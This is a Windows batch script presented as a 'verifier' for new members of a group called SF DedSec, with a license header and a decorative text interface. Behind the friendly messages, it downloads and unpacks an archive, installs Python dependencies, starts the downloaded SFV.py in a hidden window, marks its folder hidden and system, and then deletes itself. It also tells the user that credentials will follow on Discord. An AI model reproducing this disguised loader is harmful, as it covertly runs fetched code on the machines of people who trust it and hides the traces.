@ECHO OFF

rem MIT License

rem Copyright (c) 2021 SF DedSec.

rem Permission is hereby granted, free of charge, to any person obtaining a copy
rem of this software and associated documentation files (the "Software"), to deal
rem in the Software without restriction, including without limitation the rights
rem to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
rem copies of the Software, and to permit persons to whom the Software is
rem furnished to do so, subject to the following conditions:

rem The above copyright notice and this permission notice shall be included in all
rem copies or substantial portions of the Software.

rem THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
rem IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
rem FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
rem AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
rem LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
rem OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
rem SOFTWARE.


:: Thanks To Atreides, Penewave & Chalkins on the SF Forum. Special Thanks To Alexei Volkov (AlekWolf) On SS76 For
:: The Method To Self-Destruct The Batch File.
::
:: Purpose:       Verifies New SF DedSec Members.
:: Requirements:  No Requirements Needed, If Something Is Missing SFV Can Install It Automatically, No Headaches On The User.
:: Author:        Sivanna & Ava Scott on the sf forum (https://dtt6tdtgroj63iud.sf/) // PGP key encoded in BASE_64: MHgwN2QxNDkwZjgyYTIxMWEy
:: Version:       7.9.0 - UI Overhaul

:: WARNING: THIS CODE IS ONLY FOR AUTHORIZED VERIFICATION PURPOSES. ANY MALICIOUS MODIFICATION OR MISUSE OF OUR CODE WON'T BE ENTERTAINED! 

:: Specifying The Window Title & Color
TITLE SFV 7.9
COLOR 0A

PING localhost -n 1 >nul
ECHO:
ECHO \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
PING localhost -n 1 >nul
ECHO:
ECHO                                    SF DEDSEC VERIFIER
PING localhost -n 1 >nul
ECHO:
ECHO ////////////////////////////////////////////////////////////////////////////////////////////////////////////
PING localhost -n 1 >nul
ECHO:
ECHO                             VERSION 7.9 - THE ROLLING STONES
ECHO:
ECHO:
ECHO:
ECHO:
PING localhost -n 3 >nul

ECHO           Welcome To SFV 7.9 - The Rolling Stones. We Hope You Like The New UI.
PING localhost -n 3 >nul

:: Creating New Directory For SFV To Work In.
ECHO:
ECHO:
ECHO                                   [+] INITIALIZING.......
MKDIR SFV
CD SFV
PING localhost -n 4 >nul
ECHO:
ECHO                                   [+] INITIALIZATION COMPLETE. DOWNLOADING LATEST RELEASE.......
:: Downloads The Latest SFV Release From GitHub.
CURL -LJO
powershell Expand-Archive -LiteralPath "%CD%\SFV.zip" -DestinationPath "%CD%\"
del SFV.zip
ECHO:

:: Checks If Python Is Installed. If Not, Downloads & Installs The Latest Stable Version Of Python.
ECHO                                   [+] CHECKING IF PYTHON IS INSTALLED.......
ECHO:
python --version >nul
if errorlevel 0 (
    echo [+] Python Is Installed And Updated To The Latest Version, Moving On.......

) else (
    echo [-] Python Is Not Installed Or Outdated, Installing Latest Version........
    curl -LJO https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe
    python-3.9.6-amd64.exe
    echo [.] Waiting For Installation To Complete.......
    pause
)

:: Installing Required Python Modules To Run SFV
ECHO:
ECHO                                   [+] INSTALLING DEPENDENCIES.......
pip install -r dependencies.txt >nul
ECHO                                   [+] DEPENDENCIES INSTALLED, RUNNING SFV.......
ECHO:
:: Runs SFV In The Background As A Service, Because It Produces No Important Output & Running In Background Saves Resources.
powershell Start-Process -WindowStyle hidden -FilePath SFV.py
ECHO                                   [+] DONE, CLEANING UP.......
cd ..
attrib +h +s SFV
ECHO:
ECHO                                   [=] THANK YOU FOR SUBMITTING A VERIFIER APPLICATION TO SF DEDSEC.
ECHO                                   [=] YOUR CREDENTIALS WILL BE SENT VIA DISCORD IN THE NEXT 1 HOUR, PLEASE WAIT PATIENTLY.
ECHO                                   [=] PLEASE DO NOT HESITATE TO TELL BUNNYBUGS#1940 ON DISCORD ABOUT ANY DOUBTS/QUESTIONS. HAVE A GREAT DAY!
ECHO                                   [=] ~ SF DEDSEC TEAM :)
ECHO:
ECHO [=] EXITING AND SELF-DESTRUCTING FILE.
PAUSE
:: Self-Destructs The SFVerifier.bat File
goto 2>nul & del "%~f0"
